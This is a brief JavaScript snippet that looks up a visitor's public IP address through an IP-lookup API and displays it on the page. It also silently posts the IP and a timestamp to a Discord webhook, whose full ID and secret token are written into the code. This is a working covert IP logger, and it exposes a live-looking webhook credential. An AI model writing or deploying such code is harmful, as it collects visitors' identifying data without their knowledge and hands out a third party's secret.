fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
        let userIP = data.ip;
        document.getElementById('ip').textContent = userIP;

        // Send the IP to your logging service
        fetch('https://discord.com/api/webhooks/1350676229417599107/JO-q5f5w2f2MqfKCDLkdgV_4kTKGt_1TFUlB-wX9TG6e5WtmWt3a3sTh91FIk0YJjHET', { 
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ ip: userIP, timestamp: new Date() })
        });
    })
    .catch(error => console.error("Error fetching IP:", error));
